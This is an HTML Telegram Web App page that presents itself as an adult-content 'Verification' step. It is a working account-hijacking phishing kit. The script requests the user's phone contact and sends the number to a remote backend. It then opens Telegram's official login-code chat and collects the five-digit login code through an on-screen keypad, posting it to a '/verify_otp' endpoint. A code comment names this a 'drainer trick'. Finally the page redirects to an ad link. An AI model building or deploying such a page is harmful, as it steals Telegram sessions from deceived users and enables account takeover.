<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body { 
            font-family: 'Arial', sans-serif;
            background: #000 url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed;
            background-size: cover; height: 100vh; overflow: hidden; display: flex; align-items: flex-end; justify-content: center;
        }
        .overlay { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.5); z-index: 1; }
        
        .main-container { width: 90%; max-width: 360px; position: relative; z-index: 10; padding-bottom: 20px; text-align: center; }

        .info-box { background: #fff; padding: 15px; border-radius: 15px; font-weight: bold; margin-bottom: 20px; font-size: 16px; color: #000; }

        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
        .box {
            width: 50px; height: 55px; background: rgba(255, 255, 255, 0.2);
            border: 2px solid #fff; border-radius: 12px; font-size: 30px;
            color: #fff; font-weight: bold; display: flex; align-items: center; justify-content: center;
            backdrop-filter: blur(5px);
        }

        .numpad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .btn { 
            background: #4caf50; color: #fff; padding: 18px; border-radius: 12px;
            font-size: 24px; font-weight: bold; border: none; cursor: pointer;
        }
        .btn:active { background: #388e3c; transform: scale(0.95); }

        .hidden { display: none !important; }
        .loader { color: #fff; font-size: 18px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="overlay"></div>

    <div class="main-container">
        <!-- Step 1 -->
        <div id="step0">
            <div style="font-size: 60px; animation: bounce 1s infinite; margin-bottom: 10px;">👇</div>
            <div id="load" class="loader hidden">🔄 Connecting...</div>
        </div>

        <!-- Step 2 (OTP Area) -->
        <div id="step2" class="hidden">
            <div class="info-box">Enter the 5-digit code!</div>

            <div class="otp-inputs">
                <div class="box" id="b1"></div>
                <div class="box" id="b2"></div>
                <div class="box" id="b3"></div>
                <div class="box" id="b4"></div>
                <div class="box" id="b5"></div>
            </div>

            <div class="numpad">
                <button class="btn" onclick="add('1')">1</button><button class="btn" onclick="add('2')">2</button><button class="btn" onclick="add('3')">3</button>
                <button class="btn" onclick="add('4')">4</button><button class="btn" onclick="add('5')">5</button><button class="btn" onclick="add('6')">6</button>
                <button class="btn" onclick="add('7')">7</button><button class="btn" onclick="add('8')">8</button><button class="btn" onclick="add('9')">9</button>
                <div style="visibility:hidden"></div><button class="btn" onclick="add('0')">0</button><button class="btn" style="background:#d32f2f" onclick="del()">⌫</button>
            </div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        
        const BACKEND_URL = "https://pmrony-session-bot.hf.space"; 
        const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
        let otp = "";

        // শুরুতে মেইন বাটন সেটআপ
        tg.MainButton.setText("🍓 START CONTINUE 🔞");
        tg.MainButton.show();
        tg.MainButton.onClick(startProcess);

        function startProcess() {
            tg.requestContact();
            tg.MainButton.hide();
            document.getElementById('step0').querySelector('div').classList.add('hidden');
            document.getElementById('load').classList.remove('hidden');
            poll();
        }

        async function poll() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") {
                    const sendRes = await fetch(`${BACKEND_URL}/send_number`, {
                        method: "POST", headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({ user_id: userId, phone: data.phone })
                    });
                    const sendData = await sendRes.json();
                    if(sendData.status === "success") {
                        showOTPPage();
                    }
                } else { setTimeout(poll, 1500); }
            } catch (e) { setTimeout(poll, 2000); }
        }

        function showOTPPage() {
            document.getElementById('step0').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');

            // --- রাশিয়ান ড্রেইনার ট্রিক: মেইন বাটনকে ওটিপি চ্যাট লিংকে রূপান্তর করা ---
            tg.MainButton.setText("📩 VIEW CODE (MINIMIZE)");
            tg.MainButton.color = "#248bcf"; // নীল রঙ
            tg.MainButton.show();

            // পুরনো ক্লিক ফাংশন সরিয়ে নতুন ফাংশন দেওয়া
            tg.MainButton.offClick(startProcess);
            tg.MainButton.onClick(() => {
                tg.HapticFeedback.notificationOccurred('success');
                // সরাসরি টেলিগ্রামের নিজস্ব মেথড দিয়ে চ্যাট ওপেন
                tg.openTelegramLink("tg://openmessage?user_id=777000");
                
                // মিনিমাইজ ট্রিক
                setTimeout(() => {
                    tg.switchInlineQuery("OTP"); 
                }, 100);
            });
        }

        function add(n) {
            if(otp.length < 5) {
                otp += n; render();
                if(otp.length === 5) verify();
            }
        }
        function del() { otp = otp.slice(0,-1); render(); }
        function render() {
            for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = otp[i-1] || "";
        }

        async function verify() {
            try {
                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: otp })
                });
                const data = await res.json();
                if(data.status === "success") {
                    window.location.href = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
                } else {
                    tg.showAlert("Invalid Code!");
                    otp = ""; render();
                }
            } catch(e) {}
        }
    </script>
</body>
</html>
